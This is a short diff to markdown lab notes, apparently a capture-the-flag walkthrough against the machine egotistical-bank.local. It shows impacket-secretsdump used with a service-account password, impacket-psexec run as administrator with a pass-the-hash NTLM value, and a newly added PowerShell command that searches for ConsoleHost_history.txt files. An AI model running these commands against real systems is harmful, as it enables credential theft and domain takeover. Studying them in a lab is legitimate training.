@@ -25,3 +25,8 @@ impacket-secretsdump egotistical-bank.local/svc_loanmgr:'Moneymakestheworldgorou
 ```
 impacket-psexec egotistical-bank.local/administrator@10.10.10.175 -hashes aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e
 ```
+
+##### look for Console_Host_History file 
+```
+Get-ChildItem -Path C:\ -Include ConsoleHost_history.txt -File -Recurse -ErrorAction SilentlyContinue
+```
